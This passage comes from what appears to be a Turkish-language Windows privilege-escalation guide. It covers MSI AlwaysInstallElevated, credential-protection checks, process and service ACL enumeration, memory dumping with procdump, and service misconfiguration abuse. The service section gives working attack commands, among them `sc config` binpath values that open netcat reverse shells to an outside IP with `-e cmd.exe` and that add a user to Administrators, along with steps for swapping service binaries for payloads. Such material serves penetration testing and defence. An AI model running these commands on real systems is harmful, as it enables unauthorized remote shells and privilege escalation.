  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının kurulumunu **arka planda** çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de logların nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır; her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL’ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından görüntülenebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Koruması

**Windows 8.1**'den itibaren Microsoft, sistemi daha da güvenli hale getirmek için Local Security Authority (LSA) korumasını güçlendirerek güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelledi**.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz, yetkilerinizi yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları yetki yükseltmek için nasıl kötüye kullanabileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç tokenlar** hakkında bilgi edinmek ve bunları nasıl kötüye kullanabileceğinizi öğrenmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Kullanıcı ana klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini alma

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle süreçleri listelerken **sürecin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan bir ikili dosyanın **üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) için ikili dosyanın bulunduğu klasörde yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunları kötüye kullanabilirsiniz.

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, daha önce hiç açığa çıkmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bunlara erişebilme olanağıyla ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin keşif işlemlerini pasif tutun; debugger komutları göndermeyin.

**Süreç ikililerinin izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreçlerin ikili dosyalarının bulunduğu klasörlerin izinlerini denetleme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` konumundaki paylaşımlı kütüphaneleri yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış bir görev veya hizmet için tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa bu yol, görev veya hizmet modülleri bir sonraki yüklediğinde code execution açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm engelleme veya paylaşım kısıtlamalarını doğrulayın; tek başına yazılabilir bir dizin privilege escalation olduğunu kanıtlamaz. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir belge köküne sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa, sunucu tarafında code execution ana bilgisayarın ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam yolun sunulduğunu ve sunucu tarafındaki bir işleyicinin dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök yalnızca dosya oluşturulabildiğini kanıtlar. Deneme dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlü bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik düzende `C:\wamp\...`) işaret edebilir; yapılandırma dosyası da yanındaki `conf\httpd.conf` konumunda, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam olarak hangi yürütülebilir dosyayı kullandığını, hangi kullanıcı kimliğiyle çalıştığını, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dâhil) ve kök dizinin ACL’sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı yürüttüğünü kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS için, `applicationHost.config` içindeki yazılabilir bir fiziksel dizini **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili yola erişilebiliyorsa uygulama havuzu kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yol bazındaki geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi ayrıca incelenmesi gereken bir yol oluşturur: uygulamanın derleme dizini altındaki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzlarının birbirine güvenmediği durumlarda derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodu değiştirebiliyorsa, uygulamanın bu kodu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL’si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, süreç kimliği ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur üstveri incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token’ı düşük ayrıcalıklı olsa bile genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerel olarak zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, kendisi için yapılandırılmış hesabı kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarının belirtilmemesi, IIS sürümüne göre değişen havuz varsayılanlarının devralınmasına neden olabilir; bu nedenle havuz adına bakarak tahmin yürütmek yerine etkin yapılandırmayı çözümleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakların varlığını kanıtlamaz. Pasif envanter çıkarırken dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL’leri inceleyin.

Yardımcı bir süreç başlatan okunabilir bir ASP.NET işleyicisi için, istekten türetilen değerlerin kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarından nasıl geçtiğini izleyin. Çözülmüş bir token’ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren işleyici, kabuk meta karakterlerinin komutu değiştirmesine olanak tanıyabilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözülen değeri gerçekten etkileyebildiğini ve işleyiciye erişebildiğini doğrulayın; ardından etkin uygulama havuzu veya taklit edilen kimliği ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif envanter çıkarırken sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows üzerindeki bir PHP hizmetinde, istek tarafından denetlenen ve [`include` ya da `require`](https://www.php.net/manual/en/function.include.php) işlevine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasının worker kimliğiyle değerlendirilmesine yol açabilir. İsteğin ilgili ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker’ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker’ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Bir loopback dinleyicisi veya yazılabilir dosya tek başına bu zinciri kanıtlamaz; pasif envanter çıkarırken endpoint’i çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL’lerini inceleyin.

### Bellekten parola madenciliği

**procdump** adlı sysinternals aracını kullanarak çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Düşük yetkili bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML external entity kullanımına izin veriyordu; Windows'taki bir ağ varlığı, [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulaması yapılmasına neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkabileceğine dair bir bulgudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya savunmasız yol üzerinden kullanılabilir olması gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif keşif sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Services

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir service üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), incelenmesi gereken bir bulgudur; yeni bir service'in çalıştırılabileceğinin kanıtı değildir. [`CreateService bir handle döndürür`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) ve bu handle, oluşturma sırasında istenen service erişimine sahiptir; service'i daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve ilk handle kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, service hesabını, başlatma ilkesini ve çalıştırılabilir dosyanın yolunu ayrı ayrı doğrulayın. Pasif keşif sırasında service oluşturmayın veya başlatmayın.

Uzak bir service yükleme yolu için, bu SCM haklarını hedefte **aynı ağ oturum açma bilgileriyle** yazılabilen bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve service hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yoluyla ilişkilendirin. SCM hakları olağandışı ölçüde genişse ve dosya yerleştirme yolu da mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetici paylaşımı zorunlu değildir. Yalnızca paylaşıma yazma erişimi veya yalnızca SCM service oluşturma bulgusu, yeni service'in daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir service, `ImagePath` içinde bulunmasa bile başlatma, kapatma veya başka bir yaşam döngüsü olayında yardımcı bir çalıştırılabilir dosya çağırabilir. Yardımcı dosyanın adı, düşük yetkili bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve service daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek service kodunu veya belgelenmiş yardımcı dosya çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, service kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir service dizini veya eksik bir dosya tek başına service'in bu dosyayı yükleyeceğini göstermez; pasif inceleme sırasında service'i başlatmayın veya durdurmayın.

Mevcut bir service için [`SERVICE_START`, `StartService` işlevine argüman sağlanmasına izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirmeden önce service'in kodunu veya belgelenmiş arayüzünü inceleyin. Çağıranın seçtiği bir argümanı günlük veya dışa aktarma yolu olarak kullanıyorsa service kimliğini, argümandan yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi, ancak bu dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa ayrıcalık yükseltmeye dönüşebilir; yazılabilir bir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında service'i başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme agent'ı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme bulgusudur**: bu dosyada web kimlik bilgileri bulunabilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek service hesabını, WEB listener'ını ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı çalıştırma için ek olarak `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), bir komutu kaydetme ya da değiştirme konusunda etkin bir hak ve komutu service kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback üzerinde dinleyen bir listener'a yine de yerel bir kullanıcı erişebilir; ancak dosya yolu, parola veya listener tek başına bu hakların varlığını göstermez. Pasif keşif sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği yönergeleri](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir service için, service'in gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini service sınırının tamamı olarak değerlendirmeden önce alt çalıştırılabilir dosyayı ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme bulgusudur: düşük yetkili kullanıcının listener'a erişebildiğini, ilgili işlemin kullanıcının girdisini kabul ettiğini ve service alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Service hesabı, endpoint URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif keşif sırasında service işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için, çağıranın denetimindeki bir dizgenin PowerShell runspace'ine aktarılmasını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows transport credentials kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ile runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük yetkili bir çağıranın girdisinden daha yüksek bir service kimliği altında `AddScript`'e ulaşan yol, bir code-execution sınırıdır; dinleme portu, kimliği doğrulanmış istemci veya ilgisiz bir assembly'deki kullanılmayan yöntem tek başına kanıt değildir. Keşif sırasında endpoint'i çağırmadan, dağıtılmış service'i, contract'ı, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar oluştuğunda Windows'un bir service'i başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmasa bile tetikleyicileri çalıştırarak çoğu zaman ayrıcalıklı service'leri başlatabilirsiniz. Keşif ve etkinleştirme teknikleri için bkz.:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ araçlarını içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` diagnostic service'i bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), service DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link race kullandı. Gösterilen ayrıcalık yükseltme işlemi ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI repair yolu ve bu hedefi gerektiriyordu: `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Bileşendeki güvenlik açığı Ocak 2024'te giderildi.

Pasif ilk inceleme için yalnızca bu service'in hesabını ve binary path'ini inceleyin, Setup WMI compiler yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir service kaydı, Visual Studio ürün sürümü veya compiler dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme sırasında service'i başlatmak veya onarım çalıştırmak gerekmez.

Service listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir servis hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** ikili dosyasının bulunması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya etkin cihazlarla ilişkili değil._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışmak için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Hizmet ikili dosya yolunu değiştirme**

"Authenticated users" grubu bir hizmet üzerinde **SERVICE_ALL_ACCESS** izinlerine sahipse, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Servisi yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece service yapılandırmalarının değiştirilmesine olanak tanır.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Service yapılandırmalarını değiştirme yetkisini devralır.
- **GENERIC_ALL**: Service yapılandırmalarını değiştirme yetkisini de devralır.

Bu zafiyetin tespiti ve exploit edilmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Service binary'lerinde zayıf izinler

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa ancak **düşük ayrıcalıklı kullanıcılar service EXE'sini veya üst klasörünü değiştirebiliyorsa**, **binary'yi değiştirip service'i yeniden başlatarak** çoğu zaman service ele geçirilebilir.

Bir service tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi veya binary'nin bulunduğu klasörde **yazma izinleriniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bir service tarafından çalıştırılan her binary'yi **wmic** kullanarak alabilir (system32'de değil) ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL’leri, özellikle hizmetin yürütülebilir dosyasında veya bu dosyayı içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

